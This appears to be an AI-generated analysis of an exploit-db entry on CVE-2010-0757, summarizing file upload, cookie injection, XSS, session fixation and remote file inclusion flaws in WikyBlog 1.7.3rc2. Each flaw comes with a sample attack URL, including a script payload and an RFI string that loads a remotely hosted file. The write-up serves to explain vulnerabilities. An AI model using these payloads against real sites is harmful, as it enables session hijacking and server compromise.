Based on the provided content, here's an analysis of the vulnerabilities associated with CVE-2010-0757, as described in the exploit-db entry. Note that the CVE-2010-0757 is one of multiple CVEs listed in this entry:

**Vulnerabilities Present:**

1.  **File Upload Vulnerability:**
    *   **Root Cause:** The application allows users to upload files without proper sanitization or restriction of file types.
    *   **Weakness:** Insecure file upload mechanism.
    *   **Impact:** Attackers can upload malicious files (e.g., shell scripts, web shells) to the server.
    *   **Attack Vector:** The attacker must first register, then access the upload functionality via a URL like `/Wiky/index.php/Attach/(your name)?cmd=uploadform`. After that, they access the uploaded file in `/Wiky/userfiles/(your name )/uploaded/`.
    *   **Required Capabilities:** Ability to register on the website.

2.  **Cookie Manipulation (Session Fixation via `userCmd` cookie):**
    *   **Root Cause:** The application does not properly sanitize input when setting cookie values in the `Templates` module. It's also vulnerable to meta tag injection.
    *   **Weakness:** Lack of output filtering for HTTP headers and META tags. The application does not provide a new session ID upon login.
    *   **Impact:** An attacker can inject a custom cookie using a crafted URL to fix the session ID and potentially impersonate a legitimate user or carry out session fixation attacks.
    *   **Attack Vector:** By injecting a meta tag to set `userCmd` cookie using the GET parameter `which`, e.g.:
        `/Wiky/index.php/Special/Main/Templates?cmd=copy&which=<meta+http-equiv='Set-cookie'+content='userCmd=edit'>`
    *   **Required Capabilities:** Ability to send a crafted GET request to the application.

3.  **Cross-Site Scripting (XSS):**
    *   **Root Cause:**  The application does not sanitize user-supplied input before rendering it within a web page.
    *   **Weakness:** Lack of input validation and sanitization of user controlled input.
    *   **Impact:** Attackers can inject arbitrary JavaScript code to be executed in the browsers of other users, potentially leading to session hijacking, defacement, or other malicious activities.
    *   **Attack Vector:** By injecting javascript in the `which` GET parameter:
        `/Wiky/index.php/Special/Main/Templates?cmd=copy&which=<img+src=http://127.0.0.1/HomeComputer.jpg+onload=alert(213771818860)>`
    *   **Required Capabilities:** Ability to send a crafted GET request to the application.

4. **Session Fixation (via jsessionid cookie):**
    *   **Root Cause:** The application is vulnerable to `jsessionid` session fixation.
    *   **Weakness:** The application does not properly manage session IDs and allows the attacker to inject a custom `jsessionid`.
    *   **Impact:** An attacker can fix the session ID, thereby eliminating the need to obtain the user's session ID after the user logs in.
    *   **Attack Vector:** By injecting a custom `jsessionid` cookie using the URL, e.g.:
        `/Wiky/index.php/Comment/Main/;jsessionid=indoushkasessionfixation`
    *   **Required Capabilities:** Ability to send a crafted GET request to the application.

5.  **Remote File Inclusion (RFI):**
    *   **Root Cause:** The application does not properly sanitize the `langFile` parameter in `WBmap.php`, allowing an attacker to include remote files.
    *   **Weakness:** Lack of input validation in `WBmap.php` leading to arbitrary file inclusion.
    *   **Impact:** An attacker can execute malicious code by including a remote file that contains malicious code, potentially leading to complete compromise of the server.
    *  **Attack Vector:** By providing a URL to a malicious file in the langFile parameter:
    `/Wiky/include/WBmap.php?langFile=http://localhost/c.txt?`
    *   **Required Capabilities:** Ability to send a crafted GET request to the application and to host a malicious file.

**Summary:**

The exploit-db entry provides information about multiple vulnerabilities in WikyBlog 1.7.3rc2, including insecure file upload, cookie manipulation leading to session fixation, XSS, session fixation via jsessionid, and RFI. These vulnerabilities could allow attackers to gain unauthorized access, execute arbitrary code, or compromise user sessions.
